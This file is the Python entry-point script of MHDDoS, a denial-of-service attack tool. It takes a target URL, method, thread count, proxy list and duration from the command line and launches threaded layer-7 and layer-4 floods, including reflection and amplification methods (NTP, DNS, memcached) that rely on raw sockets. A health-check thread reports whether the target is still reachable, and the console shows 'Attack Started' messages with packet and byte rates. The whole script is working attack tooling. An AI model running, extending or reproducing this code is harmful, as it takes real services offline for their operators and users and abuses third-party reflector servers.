#!/usr/bin/env python3
import os
from contextlib import suppress
from json import load
from logging import basicConfig, getLogger, shutdown
from pathlib import Path
from socket import (gethostbyname)
from sys import argv
from sys import exit as _exit
from threading import Event, Thread
from time import sleep, time, perf_counter
from typing import List, Union

from PyRoxy import Tools as ProxyTools
from icmplib import Host
from requests import Response
from yarl import URL

from MHDDoS.methods.layer_4 import Layer4
from MHDDoS.methods.layer_7 import Layer7
from MHDDoS.methods.methods import Methods
from MHDDoS.methods.tools import Tools
from MHDDoS.utils.console_utils import clear_lines_from_console
from MHDDoS.utils.healthcheck_utils import TargetHealthCheckUtils
from MHDDoS.utils.logs import craft_outreach_log_message
from MHDDoS.utils.misc import Counter
from MHDDoS.utils.proxies import ProxyManager

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("MHDDoS")
logger.setLevel("INFO")

__version__: str = "2.3 SNAPSHOT"
__dir__: Path = Path(__file__).parent
bombardier_path: str = ""


def exit(*message):
    if message:
        logger.error(" ".join(message))
    shutdown()
    _exit(1)


# counters
REQUESTS_SENT = Counter()
BYTES_SENT = Counter()
TOTAL_REQUESTS_SENT = Counter()
TOTAL_BYTES_SENT = Counter()


def start():
    with open(__dir__ / "config.json") as f:
        config = load(f)
        with suppress(IndexError):
            one = argv[1].upper()

            if one == "HELP":
                raise IndexError()
            if one == "TOOLS":
                Tools.runConsole()
            if one == "STOP":
                Tools.stop()

            method = one
            host = None
            url = None
            urlraw = None
            event = Event()
            event.clear()
            host = None
            urlraw = argv[2].strip()
            urlraw = Tools.ensure_http_present(urlraw)
            port = None
            proxies = None

            if method not in Methods.ALL_METHODS:
                exit("Method Not Found %s" %
                     ", ".join(Methods.ALL_METHODS))

            if method in Methods.LAYER7_METHODS:
                url = URL(urlraw)
                host = url.host
                try:
                    host = gethostbyname(url.host)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, e)
                ip = Tools.get_ip(urlraw)
                # print(f"IP: {ip}")
                # print(f"Port: {url.port}")
                threads = int(argv[4])
                rpc = int(argv[6])
                timer = int(argv[7])
                proxy_type = int(argv[3].strip())
                proxy_path_relative = argv[5].strip()
                proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
                if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
                    proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
                useragent_file_path = Path(__dir__ / "files/useragent.txt")
                referrers_file_path = Path(__dir__ / "files/referers.txt")
                global bombardier_path
                bombardier_path = Path(__dir__ / "go/bin/bombardier")

                if method == "BOMB":
                    assert (
                            bombardier_path.exists()
                            or bombardier_path.with_suffix('.exe').exists()
                    ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"

                if len(argv) == 9:
                    logger.setLevel("DEBUG")

                if not useragent_file_path.exists():
                    exit("The Useragent file doesn't exist ")
                if not referrers_file_path.exists():
                    exit("The Referer file doesn't exist ")

                uagents = set(a.strip()
                              for a in useragent_file_path.open("r+").readlines())
                referers = set(a.strip()
                               for a in referrers_file_path.open("r+").readlines())

                if not uagents: exit("Empty Useragent File ")
                if not referers: exit("Empty Referer File ")

                if threads > 1000:
                    logger.warning("Number of threads is higher than 1000")
                if rpc > 100:
                    logger.warning("RPC (Requests Per Connection) number is higher than 100")

                proxies = ProxyManager.loadProxyList(config, proxy_file_path, proxy_type)
                proxies = ProxyManager.validateProxyList(proxies, ip, int(url.port), method, urlraw)
                for _ in range(threads):
                    Layer7(url, host, method, rpc, event, uagents, referers, proxies).start()

            if method in Methods.LAYER4_METHODS:
                url = URL(urlraw)

                port = url.port
                host = url.host

                try:
                    host = gethostbyname(host)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, e)

                if port > 65535 or port < 1:
                    exit("Invalid Port [Min: 1 / Max: 65535] ")

                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
                        not Tools.checkRawSocket():
                    exit("Cannot Create Raw Socket")

                threads = int(argv[3])
                timer = int(argv[4])
                proxies = None
                referrers = None
                if not port:
                    logger.warning("Port Not Selected, Set To Default: 80")
                    port = 80

                if len(argv) >= 6:
                    argfive = argv[5].strip()
                    if argfive:
                        referrers_file_path = Path(__dir__ / "files" / argfive)
                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
                            if not referrers_file_path.exists():
                                exit("The reflector file doesn't exist")
                            if len(argv) == 7:
                                logger.setLevel("DEBUG")
                                referrers = set(a.strip() for a in ProxyTools.Patterns.IP.findall(referrers_file_path.open("r+").read()))
                            if not referrers:
                                exit("Empty Reflector File ")

                        elif argfive.isdigit() and len(argv) >= 7:
                            if len(argv) == 8:
                                logger.setLevel("DEBUG")
                            proxy_type = int(argfive)
                            proxy_path_relative = argv[6].strip()
                            proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
                            if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
                                proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
                            proxies = ProxyManager.loadProxyList(config, proxy_file_path, proxy_type)
                            proxies = ProxyManager.validateProxyList(proxies, ip, port, method, urlraw)
                            if method not in {"MINECRAFT", "MCBOT", "TCP"}:
                                exit("this method cannot use for layer4 proxy")

                        else:
                            logger.setLevel("DEBUG")

                for _ in range(threads):
                    Layer4((host, port), referrers, method, event, proxies).start()

            # start health check thread
            if not port:
                if urlraw and "https://" in urlraw:
                    port = 443
                else:
                    port = 80
            if not host:
                host = Tools.get_ip(urlraw)
            ip = host
            health_check_thread = Thread(
                daemon=True,
                target=target_health_check_loop,
                args=(HEALTH_CHECK_INTERVAL, ip, port, method, urlraw, proxies)
            )
            health_check_thread.start()

            logger.info(f"Attack Started to {host or url.human_repr()} with {method} method for {timer} seconds, threads: {threads}!")
            event.set()
            ts = time()

            global BYTES_SENT, REQUESTS_SENT, TOTAL_REQUESTS_SENT, TOTAL_BYTES_SENT

            while time() < ts + timer:
                log_attack_status()

                # update request counts
                TOTAL_REQUESTS_SENT += int(REQUESTS_SENT)
                TOTAL_BYTES_SENT += int(BYTES_SENT)
                REQUESTS_SENT.set(0)
                BYTES_SENT.set(0)

                sleep(1)

            event.clear()
            exit()

        Tools.usage()


last_target_health_check_timestamp: float = 0
"""Time when the last target health check was started."""

HEALTH_CHECK_INTERVAL = 10
is_first_health_check_done: bool = False
last_l4_result: Host = None
last_l7_response: Union[Response, None] = None
last_l4_proxied_results: List[Host] = None
last_l7_proxied_responses: List[Union[Response, None]] = None


def target_health_check_loop(interval: float,
                             ip: str,
                             port: int,
                             method: str,
                             url: Union[str, None],
                             proxies: Union[set, None]):
    global is_first_health_check_done, last_l4_result, last_l7_response, \
        last_l4_proxied_results, last_l7_proxied_responses, last_target_health_check_timestamp

    while True:
        start_timestamp = perf_counter()

        last_l4_result, \
        last_l7_response, \
        last_l4_proxied_results, \
        last_l7_proxied_responses = TargetHealthCheckUtils.health_check(ip, port, method, url, proxies,
                                                                        layer_4_retries=1,
                                                                        layer_4_timeout=2,
                                                                        layer_4_interval=0.2,
                                                                        layer_7_timeout=10)

        last_target_health_check_timestamp = time()
        is_first_health_check_done = True

        while perf_counter() - start_timestamp < interval:
            sleep(0.1)


status_logging_started = False


def log_attack_status():
    global BYTES_SENT, REQUESTS_SENT, TOTAL_BYTES_SENT, TOTAL_REQUESTS_SENT, status_logging_started

    # craft status message
    message = "\n"
    message += craft_performance_log_message()
    message += craft_outreach_log_message(
        is_first_health_check_done,
        last_target_health_check_timestamp,
        last_l4_result,
        last_l4_proxied_results,
        last_l7_response,
        last_l7_proxied_responses
    )

    # log the message
    if not status_logging_started:
        status_logging_started = True
    else:
        message_line_count = message.count("\n") + 1
        clear_lines_from_console(message_line_count)
        # pass
    print(message, end="")


def craft_performance_log_message():
    # craft the status log message
    pps = Tools.humanformat(int(REQUESTS_SENT))
    bps = Tools.humanbytes(int(BYTES_SENT))
    tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
    tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
    status_string = f"Status:\n" \
                    f"    Outgoing data:\n" \
                    f"       Per second:\n" \
                    f"          Packets/s: {pps}\n" \
                    f"          Bytes/s:   {bps}\n" \
                    f"       Total since the attack started:\n" \
                    f"          Packets sent: {tp}\n" \
                    f"          Bytes sent:   {tb}\n"

    return status_string


if __name__ == '__main__':
    start()
